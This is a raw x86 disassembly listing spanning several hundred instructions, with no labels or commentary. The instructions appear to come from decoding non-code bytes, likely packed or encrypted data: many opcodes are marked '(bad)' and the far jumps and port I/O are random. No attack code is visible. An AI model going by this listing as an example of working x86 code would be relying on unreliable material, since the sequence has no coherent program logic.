  41b4a6:	adc    esi,DWORD PTR [ecx-0x4379e81d]
  41b4ac:	pushf  
  41b4ad:	shl    al,0x40
  41b4b0:	or     eax,DWORD PTR [esi-0x40]
  41b4b3:	push   ds
  41b4b4:	loope  0x41b492
  41b4b6:	adc    BYTE PTR [eax+eax*1+0x156058aa],ah
  41b4bd:	xchg   esi,eax
  41b4be:	lock mov cl,bl
  41b4c1:	sbb    eax,0xf25b3e86
  41b4c6:	add    eax,DWORD PTR [esi-0x3e]
  41b4c9:	retf   0xe10f
  41b4cc:	sub    esp,DWORD PTR [esi-0x48e3923f]
  41b4d2:	sbb    eax,0xc2c11795
  41b4d7:	cmp    esi,DWORD PTR [ecx+0x49335817]
  41b4dd:	push   cs
  41b4de:	mov    eax,ds:0x78f7d121
  41b4e3:	xchg   edi,eax
  41b4e4:	add    DWORD PTR [ebp+eax*2-0x58fe1c73],esi
  41b4eb:	stc    
  41b4ec:	in     al,0xa8
  41b4ee:	push   eax
  41b4ef:	dec    DWORD PTR [ebx+0x5993445a]
  41b4f5:	mov    ch,0xb1
  41b4f7:	or     BYTE PTR [edx-0x7c1c82eb],dh
  41b4fd:	xchg   ecx,eax
  41b4fe:	test   eax,0x35940182
  41b503:	es pop edx
  41b505:	ret    0x8996
  41b508:	aaa    
  41b509:	dec    ebp
  41b50a:	sub    eax,0x83bbdb92
  41b50f:	adc    DWORD PTR [esi+0x0],esi
	...
  41b571:	add    BYTE PTR [eax],al
  41b573:	add    ah,dl
  41b575:	in     al,dx
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	scas   al,BYTE PTR es:[edi]
  41b581:	add    ecx,DWORD PTR [ecx+0x7]
  41b584:	and    al,BYTE PTR [bx+di]
  41b587:	add    BYTE PTR ds:0x1f000001,al
  41b58d:	xchg   ebp,eax
  41b58e:	pusha  
  41b58f:	inc    edx
  41b590:	cwde   
  41b591:	inc    DWORD PTR [eax+ebp*8+0x4e]
  41b595:	fist   DWORD PTR [esi-0xa]
  41b598:	mov    esi,0x6cd0879a
  41b59d:	xor    edx,DWORD PTR [eax+0x4665dbb]
  41b5a3:	mov    eax,ds:0x5cc181be
  41b5a8:	arpl   WORD PTR [ebp-0x41],ax
  41b5ab:	lods   al,BYTE PTR ds:[esi]
  41b5ac:	push   ecx
  41b5ad:	data16 sti 
  41b5af:	les    edi,FWORD PTR [esi]
  41b5b1:	or     al,dl
  41b5b3:	cwde   
  41b5b4:	rol    ecx,1
  41b5b6:	cmp    cl,BYTE PTR [edi+eiz*2-0x29]
  41b5ba:	and    eax,0xe41ffbee
  41b5bf:	jmp    0x176d:0x228768f7
  41b5c6:	fimul  DWORD PTR [esi+0x1c]
  41b5c9:	call   0xb956:0xf5d8114b
  41b5d0:	cmp    edi,DWORD PTR [ebp+0x4c]
  41b5d3:	bswap  esi
  41b5d5:	or     eax,0xa9b29cce
  41b5da:	and    bl,cl
  41b5dc:	xlat   BYTE PTR ds:[ebx]
  41b5dd:	into   
  41b5de:	dec    edi
  41b5df:	fistp  QWORD PTR [ebx+0x243cc497]
  41b5e5:	mov    BYTE PTR [ecx+0x2364dcd5],ch
  41b5eb:	pop    edi
  41b5ec:	daa    
  41b5ed:	test   eax,0xf02b0db9
  41b5f2:	push   es
  41b5f3:	push   esp
  41b5f4:	pushf  
  41b5f5:	int    0xc1
  41b5f7:	push   eax
  41b5f8:	xchg   ebp,eax
  41b5f9:	xchg   ecx,eax
  41b5fa:	add    ecx,DWORD PTR [esi-0x29]
  41b5fd:	stos   BYTE PTR es:[edi],al
  41b5fe:	sbb    esp,edx
  41b600:	xchg   BYTE PTR [edi+0x199203d2],dl
  41b606:	(bad)  
  41b607:	(bad)  
  41b608:	mov    ds:0x341d1c82,al
  41b60d:	jle    0x41b633
  41b60f:	jbe    0x41b5a9
  41b611:	xchg   DWORD PTR [bp+si],esi
  41b614:	std    
  41b615:	daa    
  41b616:	jns    0x41b5b2
  41b618:	ret    0x37c3
  41b61b:	jle    0x41b60c
  41b61d:	lods   al,BYTE PTR ds:[esi]
  41b61e:	aas    
  41b61f:	inc    esi
  41b620:	dec    ecx
  41b621:	mov    eax,0x46973486
  41b626:	xor    al,0xda
  41b628:	mov    edx,0x93bb9616
  41b62d:	or     eax,0x7e3af23d
  41b632:	push   esi
  41b633:	clc    
  41b634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b635:	adc    al,0x99
  41b637:	adc    BYTE PTR [esi+0x68],dl
  41b63a:	iret   
  41b63b:	lods   al,BYTE PTR ds:[esi]
  41b63c:	(bad)  
  41b63e:	xchg   esi,eax
  41b63f:	xchg   edx,eax
  41b640:	xor    BYTE PTR [esi],0x49
  41b643:	xor    al,0x5c
  41b645:	mov    dl,0xdb
  41b647:	and    al,0xac
  41b649:	push   ebx
  41b64a:	icebp  
  41b64b:	and    al,0xa
  41b64d:	or     cl,BYTE PTR [edx-0x134f5a23]
  41b653:	mov    ds:0xa4c6c702,al
  41b658:	inc    esi
  41b659:	mov    cl,0xb
  41b65b:	popa   
  41b65c:	lahf   
  41b65d:	adc    DWORD PTR [edx],edx
  41b65f:	pop    edx
  41b660:	call   0x8f8d8da3
  41b665:	sbb    eax,0x41790b02
  41b66a:	ja     0x41b651
  41b66c:	inc    DWORD PTR [ecx*1-0x368f06a0]
  41b673:	fs and eax,0x83ea487
  41b679:	sti    
  41b67a:	cmp    BYTE PTR [ebp+0x37e87a2],bl
  41b680:	mov    cl,0x96
  41b682:	outs   dx,BYTE PTR ds:[esi]
  41b683:	loopne 0x41b6d3
  41b685:	loop   0x41b677
  41b687:	jmp    0x85cbb831
  41b68c:	sub    al,0x19
  41b68e:	std    
  41b68f:	shl    BYTE PTR [eax+eax*1+0x0],1
	...
  41b6f2:	add    BYTE PTR [eax],al
  41b6f4:	test   al,0x63
  41b6f6:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b6fc:	sti    
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	or     ch,BYTE PTR [esi+0x22]
  41b703:	outs   dx,DWORD PTR ds:[esi]
  41b704:	ins    BYTE PTR es:[edi],dx
  41b705:	and    eax,DWORD PTR [ecx]
  41b707:	add    BYTE PTR ds:0xda000001,al
  41b70d:	fdivr  QWORD PTR [esi+0x235c2c3c]
  41b713:	mov    eax,0x75e7bfb3
  41b718:	pop    ebx
  41b719:	mov    al,ds:0x30b18b7a
  41b71e:	and    dl,BYTE PTR [edx+0x6b63c607]
  41b724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b725:	jle    0x41b714
  41b727:	or     DWORD PTR [ebx+0x8f07818],eax
  41b72d:	mov    bh,0x4a
  41b72f:	and    cl,BYTE PTR [edx]
  41b731:	(bad)  
  41b732:	mov    dl,0xe4
  41b734:	mov    WORD PTR [esi+edi*1-0x55],gs
  41b738:	xor    BYTE PTR [ebp-0x6e],dh
  41b73b:	xor    eax,0xa0df1a98
  41b740:	in     al,0xf9
  41b742:	cmp    al,0xc3
  41b745:	sti    
  41b746:	daa    
  41b747:	pop    edi
  41b748:	gs dec esi
  41b74a:	js     0x41b77c
  41b74c:	loope  0x41b6d4
  41b74e:	shl    BYTE PTR [esp+eax*8+0x706c2852],1
  41b755:	jmp    0x4d18:0x2fd4be2d
  41b75c:	push   cs
  41b75d:	(bad)  
  41b75e:	test   BYTE PTR [eax+0x38],0xbe
  41b762:	sub    DWORD PTR [edi+0x16],ecx
  41b765:	dec    BYTE PTR [esi]
  41b767:	xlat   BYTE PTR ds:[ebx]
  41b768:	jl     0x41b7e5
  41b76a:	mov    ds:0xf76b8f2b,eax
  41b76f:	or     esp,ebp
  41b771:	mov    cs,ecx
  41b773:	mov    ds:0x20be366a,eax
  41b778:	add    cl,BYTE PTR [edx+0x4dcbf6c3]
  41b77e:	push   ebp
  41b77f:	adc    eax,0x73ac91f3
  41b784:	(bad)  
  41b785:	jno    0x41b71d
  41b787:	loope  0x41b716
  41b789:	xchg   esp,eax
  41b78a:	test   BYTE PTR [ebp-0x5f],0xb4
  41b78e:	sahf   
  41b78f:	in     al,0x2d
  41b791:	adc    ebx,edi
  41b793:	cmp    DWORD PTR [edi-0x40],edi
  41b796:	push   edi
  41b797:	pop    esp
  41b798:	mov    eax,ds:0xa63da1a4
  41b79d:	mov    dh,0xeb
  41b79f:	icebp  
  41b7a0:	or     eax,0xf40eb820
  41b7a5:	xlat   BYTE PTR ds:[ebx]
  41b7a6:	push   esi
  41b7a7:	(bad)  
  41b7a8:	jge    0x41b781
  41b7aa:	mov    edx,0x3661c8f7
  41b7af:	or     eax,0xe8ff6e0f
  41b7b4:	cmp    eax,0x20dea062
  41b7b9:	fimul  WORD PTR [edx-0x3]
  41b7bc:	xor    eax,0x68f56f61
  41b7c1:	out    0x48,eax
  41b7c3:	stos   BYTE PTR es:[edi],al
  41b7c4:	inc    esp
  41b7c5:	les    eax,FWORD PTR [edx-0x7d2b35bd]
  41b7cb:	ins    BYTE PTR es:[edi],dx
  41b7cc:	jmp    0x89364cce
  41b7d1:	(bad)  [edx+0x8]
  41b7d4:	shl    DWORD PTR [esi],1
  41b7d6:	outs   dx,DWORD PTR ds:[esi]
  41b7d7:	or     ecx,DWORD PTR [ecx]
  41b7d9:	lock jecxz 0x41b78a
  41b7dc:	sbb    dl,BYTE PTR [ecx+0x37a24658]
  41b7e2:	addr16 mov bl,0xd0
  41b7e5:	xor    eax,0xc0e9739e
  41b7ea:	fmul   st(5),st
  41b7ec:	mov    ds:0xc53ad3e8,al
  41b7f1:	cli    
  41b7f2:	jl     0x41b7f6
  41b7f4:	sti    
  41b7f5:	xlat   BYTE PTR ds:[ebx]
  41b7f6:	xor    DWORD PTR [ebx],esi
  41b7f8:	pop    edx
  41b7f9:	jecxz  0x41b82b
  41b7fb:	xor    bl,0xd8
  41b7fe:	sbb    cl,bl
  41b800:	xor    ah,BYTE PTR [esi+0x1a016c44]
  41b806:	out    0xa3,eax
  41b808:	das    
  41b809:	sub    BYTE PTR [ebp+esi*2-0xe],al
  41b80d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b80e:	mov    ebx,0xe428
	...
  41b873:	add    BYTE PTR [edx-0x8b13804],cl
  41b879:	jg     0x41b806
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x4e
  41b881:	xor    esi,esp
  41b883:	pop    edi
  41b884:	jno    0x41b8aa
  41b886:	add    DWORD PTR [eax],eax
  41b888:	add    eax,0x1c000001
  41b88d:	sub    eax,DWORD PTR ds:0xf5ab2185
  41b893:	shr    DWORD PTR [esi-0x40],1
  41b896:	and    DWORD PTR [ecx+0x211ea723],ebp
  41b89c:	int    0xa8
  41b89e:	dec    esi
  41b89f:	xor    al,0x98
  41b8a1:	cdq    
  41b8a2:	(bad)  
  41b8a3:	fisub  DWORD PTR [eax+0xec14547]
  41b8a9:	or     BYTE PTR [ebp-0x2a],bl
  41b8ac:	call   0xe6c3:0x2d65e65b
  41b8b3:	sbb    DWORD PTR [esi+edx*4],0x14
  41b8b7:	stos   BYTE PTR es:[edi],al
  41b8b8:	inc    esp
  41b8b9:	aaa    
  41b8ba:	lock sbb BYTE PTR ds:0x60391e,0xb2
  41b8c2:	out    0xb0,al
  41b8c4:	pop    ebx
  41b8c5:	add    eax,edx
  41b8c7:	xor    edi,DWORD PTR [ebp-0x25]
  41b8ca:	inc    eax
  41b8cb:	push   edi
  41b8cc:	je     0x41b89f
  41b8ce:	(bad)  
  41b8cf:	and    bl,BYTE PTR [esi]
  41b8d1:	pop    ebp
  41b8d2:	je     0x41b8cd
  41b8d4:	xor    DWORD PTR [eax+0x73dcd50],ebx
  41b8da:	mov    al,ds:0x1141e4f9
  41b8df:	adc    esi,DWORD PTR ds:0xcb9f1590
  41b8e5:	inc    ecx
  41b8e6:	adc    edx,esi
  41b8e8:	push   esi
  41b8e9:	pushf  
  41b8ea:	or     DWORD PTR [ebx+0x483f6233],edx
  41b8f0:	sub    eax,0xbcc349d0
  41b8f5:	sti    
  41b8f6:	dec    eax
  41b8f7:	loope  0x41b931
  41b8f9:	fcom   DWORD PTR [esi+0x1a0a49dc]
  41b8ff:	push   es
  41b900:	out    dx,al
  41b901:	stos   DWORD PTR es:[edi],eax
  41b902:	shl    BYTE PTR [ebx+0x45c610bb],0xeb
  41b909:	jmp    0xa85fbac5
  41b90e:	movntps XMMWORD PTR [edx+0x5f39ce95],xmm3
  41b915:	jb     0x41b96a
  41b917:	adc    ebp,DWORD PTR [eax]
  41b919:	xchg   DWORD PTR [esp+ecx*8],edx
  41b91c:	dec    esp
  41b91d:	jae    0x41b93d
  41b91f:	call   0x31680d4e
  41b924:	idiv   DWORD PTR [esi+0x23341fc5]
  41b92a:	bound  ecx,QWORD PTR [ecx]
  41b92c:	jg     0x41b944
  41b92e:	sbb    eax,0x404d09ed
  41b933:	lahf   
  41b934:	icebp  
  41b935:	xchg   ebp,eax
  41b936:	jne    0x41b97f
  41b938:	(bad)  
  41b939:	jo     0x41b99c
  41b93b:	jmp    0x86de:0x21e00aaa
  41b942:	jmp    0x41b993
  41b944:	mov    al,gs:0x8a0c9d45
  41b94a:	sub    esi,DWORD PTR [edx]
  41b94c:	xchg   ecx,eax
  41b94d:	sbb    ebx,DWORD PTR [eax+0x656bd0b0]
  41b953:	mov    edi,0xed33bf8e
  41b958:	adc    ch,BYTE PTR [ebx-0x4a]
  41b95b:	dec    esp
  41b95c:	out    dx,al
  41b95d:	leave  
  41b95e:	retf   
  41b95f:	stos   BYTE PTR es:[edi],al
  41b960:	test   DWORD PTR [esi],0x1e907385
  41b966:	add    al,0xa5
  41b968:	out    dx,al
  41b969:	mov    esi,0x13101cee
  41b96e:	xor    eax,0xdaaeb6ce
  41b973:	pushf  
  41b974:	call   0x9787:0xc9957363
  41b97b:	test   al,0xac
  41b97d:	(bad)  
  41b97e:	cmp    eax,eax
  41b980:	inc    ebp
  41b981:	scas   al,BYTE PTR es:[edi]
  41b982:	or     ecx,ebx
  41b984:	push   0xffffffcf
  41b986:	inc    ecx
  41b987:	(bad)  
  41b988:	cmc    
  41b989:	jl     0x41b937
  41b98b:	pusha  
  41b98c:	(bad)  
  41b98d:	fsubp  st(7),st
  41b98f:	ins    DWORD PTR es:[edi],dx
  41b990:	das    
	...
  41b9f1:	add    BYTE PTR [eax],al
  41b9f3:	add    bl,al
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	mov    ds:0x76b09563,eax
  41ba05:	and    eax,0x1050001
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	or     al,BYTE PTR [ebx+0x128ecca5]
  41ba12:	loopne 0x41ba8b
  41ba14:	adc    DWORD PTR [ecx],0x79
  41ba17:	addr16 je 0x41b9f4
  41ba1a:	jmp    0x522e392a
  41ba1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba20:	dec    ebx
  41ba21:	es cmc 
  41ba23:	jno    0x41b9e1
  41ba25:	sub    eax,DWORD PTR ss:[edi]
  41ba28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba29:	aaa    
  41ba2a:	jno    0x41ba3a
  41ba2c:	xor    esi,ebx
  41ba2e:	ret    0x7c47
  41ba31:	jns    0x41ba0f
  41ba33:	xchg   edx,eax
  41ba34:	mov    esp,0xa6249271
  41ba39:	sbb    dh,BYTE PTR [eax]
  41ba3b:	neg    DWORD PTR [ebx+0x3142f69e]
  41ba41:	imul   BYTE PTR [ebp-0x21a8ceb4]
  41ba47:	(bad)  
  41ba48:	imul   ebp,DWORD PTR [edi],0x43
  41ba4b:	push   esp
  41ba4c:	fmulp  st(1),st
  41ba4e:	mov    al,ds:0xc824f370
  41ba53:	or     DWORD PTR [ecx+0x24],edx
  41ba56:	push   es
  41ba57:	xchg   esp,eax
  41ba58:	xchg   esi,eax
  41ba59:	and    DWORD PTR [ecx+eiz*2-0x3eed8d7d],esp
  41ba60:	pop    edi
  41ba61:	out    dx,al
  41ba62:	mov    al,BYTE PTR [esi+0x66]
  41ba65:	inc    esi
  41ba66:	xor    BYTE PTR [eax-0x2289eafb],bh
  41ba6c:	mov    al,ds:0x31b16c20
  41ba71:	int    0x23
  41ba73:	aam    0x70
  41ba75:	mov    ah,al
  41ba77:	enter  0xb277,0x59
  41ba7b:	adc    DWORD PTR [esi+0x2c],ebp
  41ba7e:	pusha  
  41ba7f:	(bad)  [edi-0x6ebbc1c4]
  41ba85:	mov    ebx,0x55458d3c
  41ba8a:	jp     0x41ba24
  41ba8c:	xor    DWORD PTR [ecx+0x2866dbfe],esi
  41ba92:	add    BYTE PTR [edi+0x3f4ce22d],dl
  41ba98:	fisttp WORD PTR [esi]
  41ba9a:	adc    eax,0xae3f9f8a
  41ba9f:	sbb    al,bl
  41baa1:	push   es
  41baa2:	jns    0x41bad2
  41baa4:	nop
  41baa5:	je     0x41ba7e
  41baa7:	cmc    
  41baa8:	inc    edi
  41baa9:	mov    bl,0xe3
  41baab:	ins    DWORD PTR es:[edi],dx
  41baac:	repz mov esi,0xe49dd9df
  41bab2:	imul   ecx,esp,0x5af3535e
  41bab8:	shr    BYTE PTR [esi+0x68],0x92
  41babc:	or     edx,ecx
  41babe:	es push edi
  41bac0:	dec    edx
  41bac1:	xor    DWORD PTR [ebp-0x58379116],0x4b
  41bac8:	loope  0x41ba96
  41baca:	(bad)  
  41bacb:	xor    al,0x1c
  41bacd:	and    al,ah
  41bacf:	mov    esp,0x2333dff1
  41bad4:	dec    edi
  41bad5:	jle    0x41bb34
  41bad7:	sbb    edx,eax
  41bad9:	and    dl,cl
  41badb:	pushf  
  41badc:	ins    BYTE PTR es:[edi],dx
  41badd:	xor    dh,cl
  41badf:	xchg   BYTE PTR [edi-0x7f],dl
  41bae2:	test   BYTE PTR [ecx+0x1319a67],dh
  41bae8:	nop
  41bae9:	jp     0x41bae4
  41baeb:	push   ds
  41baec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41baed:	mov    eax,0x1fb7fcb5
  41baf2:	adc    ebp,DWORD PTR [esi-0x68]
  41baf5:	ret    0x355f
  41baf8:	xchg   ecx,eax
  41baf9:	jmp    0xdff3ef25
  41bafe:	stos   BYTE PTR es:[edi],al
  41baff:	les    ecx,FWORD PTR [edx]
  41bb01:	cs lahf 
  41bb03:	lock add esi,ebx
  41bb06:	test   DWORD PTR [edi-0x51],edx
  41bb09:	inc    edi
  41bb0a:	jns    0x41bad1
  41bb0c:	jmp    0x33ff9a00
	...
  41bb71:	add    BYTE PTR [eax],al
  41bb73:	add    BYTE PTR [edx],cl
  41bb75:	mov    eax,0xbfb7aaa5
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi-0x76],cx
  41bb81:	mov    ds:0x267b832d,eax
  41bb86:	add    DWORD PTR [eax],eax
  41bb88:	add    eax,0x42000001
  41bb8d:	cwde   
  41bb8e:	xchg   esi,eax
  41bb8f:	rcr    BYTE PTR [edi-0x5113ba5e],0xe2
  41bb96:	js     0x41bba5
  41bb98:	inc    esp
  41bb99:	dec    ebp
  41bb9a:	fcom   DWORD PTR [edx+0x74f23560]
  41bba0:	ror    BYTE PTR [ecx+0x41],1
  41bba3:	xor    edi,eax
  41bba5:	es jns 0x41bb38
  41bba8:	rcr    DWORD PTR [edi-0x6],0xd6
  41bbac:	or     eax,eax
  41bbae:	and    DWORD PTR [esi+0x58],ebp
  41bbb1:	(bad)  
  41bbb2:	push   edx
  41bbb3:	add    BYTE PTR [edi-0x8],al
  41bbb6:	jne    0x41bb94
  41bbb8:	pushf  
  41bbb9:	daa    
  41bbba:	add    eax,0x7ad36f5a
  41bbbf:	loop   0x41bba9
  41bbc1:	out    0x31,eax
  41bbc3:	cmp    eax,0xfbe6793f
  41bbc8:	mov    edx,0xc12bc0cc
  41bbcd:	jnp    0x41bbc0
  41bbcf:	arpl   WORD PTR [ecx+0xe447d0c],di
  41bbd5:	cdq    
  41bbd6:	(bad)  
  41bbd7:	enter  0xec8d,0x2
  41bbdb:	cmp    al,0xe2
  41bbdd:	sbb    ecx,edx
  41bbdf:	in     eax,0x62
  41bbe1:	scas   eax,DWORD PTR es:[edi]
  41bbe2:	push   ebp
  41bbe3:	add    edx,DWORD PTR [edx-0x69]
  41bbe6:	(bad)
  41bbe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbea:	xlat   BYTE PTR ds:[ebx]
  41bbeb:	adc    dh,BYTE PTR [ebp+0x2b294264]
  41bbf1:	dec    esp
  41bbf2:	retf   0x93cf
  41bbf5:	sub    al,0x62
  41bbf7:	xchg   ebp,eax
  41bbf8:	sbb    esp,eax
  41bbfa:	mov    eax,ecx
  41bbfc:	out    dx,al
  41bbfd:	fmulp  st(7),st
  41bbff:	sahf   
  41bc00:	and    BYTE PTR [ecx+0x4b],0x10
  41bc04:	imul   esp,DWORD PTR [ebx],0x232b288d
  41bc0a:	mov    bl,0x13
  41bc0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc0d:	inc    edi
  41bc0e:	fcmovu st,st(6)
  41bc10:	pop    esi
  41bc11:	push   0xa1bb7b9f
  41bc16:	nop
  41bc17:	retf   
  41bc18:	xchg   esi,eax
  41bc19:	pop    esp
  41bc1a:	xlat   BYTE PTR ds:[ebx]
  41bc1b:	and    al,0xd2
  41bc1d:	or     eax,0x588a4ce5
  41bc22:	cmc    
  41bc23:	add    BYTE PTR [ecx-0x2],dl
  41bc26:	std    
  41bc27:	lds    edi,FWORD PTR [eax+ecx*4]
  41bc2a:	add    DWORD PTR [ecx],edi
  41bc2c:	dec    edi
  41bc2d:	aad    0xb9
  41bc2f:	aaa    
  41bc30:	or     bl,BYTE PTR [esi-0x76]
  41bc33:	add    DWORD PTR [eax],edx
  41bc35:	add    eax,0xc89282d4
  41bc3a:	fst    DWORD PTR [ebx]
  41bc3c:	xchg   ebx,eax
  41bc3d:	or     eax,ebx
  41bc3f:	mov    cl,0x73
  41bc41:	sub    BYTE PTR [ebp-0x5e],al
  41bc44:	(bad)  
  41bc45:	(bad)  
  41bc46:	jp     0x41bc51
  41bc48:	aad    0xa4
  41bc4a:	sub    DWORD PTR [eax+eiz*2],ecx
  41bc4d:	fisttp WORD PTR [edi+0x7a634d4f]
  41bc53:	cwde   
  41bc54:	push   ebp
  41bc55:	lods   al,BYTE PTR ds:[esi]
  41bc56:	icebp  
  41bc57:	test   eax,0x1a64fcc6
  41bc5c:	and    edi,DWORD PTR ds:[ebx-0x69]
  41bc60:	in     eax,0x5a
  41bc62:	sbb    al,0xf9
  41bc64:	push   0x1e
  41bc66:	cmc    
  41bc67:	dec    edi
  41bc68:	mov    esi,0xd9f085f6
  41bc6d:	jns    0x41bc4a
  41bc6f:	jae    0x41bc92
  41bc71:	fbstp  TBYTE PTR [ecx]
  41bc73:	ss ds pop esi
  41bc76:	or     ah,al
  41bc78:	and    esp,DWORD PTR [edi]
  41bc7a:	or     dh,BYTE PTR ds:0x3215f407
  41bc80:	mov    edi,0x9fdcf6c9
  41bc85:	xor    al,bh
  41bc87:	addr16 xchg edx,eax
  41bc89:	test   eax,0xb4f3c603
  41bc8e:	mov    ds:0xbf42,al
	...
  41bcf3:	add    dl,dl
  41bcf5:	xor    bh,dl
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x5588d9d8
  41bd02:	xchg   BYTE PTR [edx],ah
  41bd04:	and    BYTE PTR [edi],0x1
  41bd07:	add    BYTE PTR ds:0x46000001,al
  41bd0d:	fidiv  DWORD PTR [ebp-0x7f5d436]
  41bd13:	mov    DWORD PTR [eax+0x4c],ecx
  41bd16:	loope  0x41bd42
  41bd18:	adc    ebx,DWORD PTR [ebx+0x4b]
  41bd1b:	jno    0x41bd49
  41bd1d:	not    DWORD PTR [edx]
  41bd1f:	mov    esp,0x7b49e84d
  41bd24:	pop    eax
  41bd25:	dec    ecx
  41bd26:	daa    
  41bd27:	imul   ebx,DWORD PTR [ecx],0xdd2219c2
  41bd2d:	dec    edi
  41bd2e:	sbb    BYTE PTR [eax-0x30],0xb3
  41bd32:	enter  0x8694,0x9f
  41bd36:	iret   
  41bd37:	aas    
  41bd38:	or     eax,0x61e30f35
  41bd3d:	jbe    0x41bccd
  41bd3f:	jle    0x41bd29
  41bd41:	pop    edi
  41bd42:	xchg   ebx,eax
  41bd43:	push   ds
  41bd44:	outs   dx,BYTE PTR ds:[esi]
  41bd45:	inc    esp
  41bd46:	or     eax,0xe0cba083
  41bd4b:	cwde   
  41bd4c:	(bad)  [esi]
  41bd4e:	sub    ah,BYTE PTR [ecx]
  41bd50:	sub    al,al
  41bd52:	mov    ebp,0xe61f094f
  41bd57:	adc    al,0x85
  41bd59:	sahf   
  41bd5a:	mov    esp,0xbd56670a
  41bd5f:	fmul   QWORD PTR [eax]
  41bd61:	repz push esi
  41bd63:	add    BYTE PTR ds:0x7aeed29e,0x34
  41bd6a:	cli    
  41bd6b:	mov    edx,0x6ab9d04a
  41bd70:	jo     0x41bd0c
  41bd72:	shl    dl,0xd5
  41bd75:	test   eax,0xe6663485
  41bd7a:	pop    ebp
  41bd7b:	(bad)  
  41bd7c:	call   0x73c3620c
  41bd81:	daa    
  41bd82:	neg    DWORD PTR [ebp-0x67]
  41bd85:	dec    esi
  41bd86:	or     ch,bl
  41bd88:	adc    eax,0xd42d78cf
  41bd8d:	mov    al,0x65
  41bd8f:	inc    ecx
  41bd90:	leave  
  41bd91:	sti    
  41bd92:	xchg   esi,eax
  41bd93:	shl    DWORD PTR [edi-0x39b8b795],cl
  41bd99:	mov    ecx,0x5d09d5f7
  41bd9e:	out    0xcc,eax
  41bda0:	out    dx,eax
  41bda1:	and    bl,al
  41bda3:	jl     0x41bd40
  41bda5:	fs pop esp
  41bda7:	cmp    cl,ah
  41bda9:	dec    esp
  41bdaa:	adc    DWORD PTR [ebx+0x5b],esi
  41bdad:	outs   dx,DWORD PTR ds:[esi]
  41bdae:	jmp    0x41bd9b
  41bdb0:	pushf  
  41bdb1:	mov    edi,ebp
  41bdb3:	pop    edx
  41bdb4:	or     DWORD PTR [eax+0x7d94f01a],ecx
  41bdba:	mov    WORD PTR [eax+0x46],fs
  41bdbd:	sar    DWORD PTR [esp+edx*4],1
  41bdc0:	jge    0x41bd44
  41bdc2:	in     al,0x27
  41bdc4:	int3   
  41bdc5:	mov    ah,0x9
  41bdc7:	sbb    al,0xb2
  41bdc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdca:	mov    ah,0xe6
  41bdcc:	ins    BYTE PTR es:[edi],dx
  41bdcd:	test   BYTE PTR [edx-0x56],al
  41bdd0:	xor    ah,ah
  41bdd2:	mov    ds:0xb99449ae,al
  41bdd7:	adc    DWORD PTR [edi-0x50],edx
  41bdda:	jg     0x41bdda
  41bddc:	mul    BYTE PTR [eax-0x6ed11eb7]
  41bde2:	in     al,0x15
  41bde4:	shl    BYTE PTR [ecx-0x7e],1
  41bde7:	xchg   esp,eax
  41bde8:	or     eax,0x42e943c0
  41bded:	xor    eax,0x17e26606
  41bdf2:	push   ecx
  41bdf3:	das    
  41bdf4:	iret   
  41bdf5:	daa    
  41bdf6:	pop    esp
  41bdf7:	or     ebx,ebp
  41bdf9:	mov    cl,0x55
  41bdfb:	dec    ebx
  41bdfc:	xor    eax,0x20806b6c
  41be01:	push   ebx
  41be02:	inc    BYTE PTR [esi-0x21c0c4fa]
  41be08:	mov    ch,0xf2
  41be0a:	xchg   ebx,eax
  41be0b:	imul   ebp,DWORD PTR [di+0x55],0xffffffa1
  41be10:	xlat   BYTE PTR ds:[ebx]
	...
  41be71:	add    BYTE PTR [eax],al
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx-0x328fc09a]
  41be82:	outs   dx,DWORD PTR ds:[esi]
  41be83:	stc    
  41be84:	test   DWORD PTR [eax],ebp
  41be86:	add    DWORD PTR [eax],eax
  41be88:	add    eax,0xea000001
  41be8d:	mov    eax,ds:0x1db539aa
  41be92:	inc    ebx
  41be93:	lea    eax,[edx-0x1e964a0d]
  41be99:	aas    
  41be9a:	push   si
  41be9c:	and    ch,BYTE PTR [edx]
  41be9e:	xchg   edx,eax
  41be9f:	aad    0xed
  41bea1:	cmp    DWORD PTR [edi],edi
  41bea3:	dec    esp
  41bea4:	fistp  DWORD PTR [edi-0x41919ff9]
  41beaa:	lds    ecx,FWORD PTR [edi+0x7cf05bc]
  41beb0:	into   
  41beb1:	lea    ecx,[ecx+0xb]
  41beb4:	push   ds
  41beb5:	sbb    esi,DWORD PTR [edi-0x63b215da]
  41bebb:	imul   eax,DWORD PTR [ecx+0x54d68983],0x70
  41bec2:	pop    ecx
  41bec3:	pop    ebx
  41bec4:	and    DWORD PTR [eax-0x18],esp
  41bec7:	cwde   
  41bec8:	cmp    BYTE PTR [ebx],dl
  41beca:	data16 and al,0x13
  41becd:	jae    0x41bf0b
  41becf:	pop    ecx
  41bed0:	jo     0x41bf40
  41bed2:	xchg   ebx,eax
  41bed3:	dec    edx
  41bed4:	xor    eax,eax
  41bed6:	shl    DWORD PTR [ecx],1
  41bed8:	pop    ebx
  41bed9:	xchg   ecx,eax
  41beda:	call   0xb54a:0xf780c955
  41bee1:	imul   esi,esp,0x6c
  41bee4:	xchg   si,ax
  41bee6:	jae    0x41be71
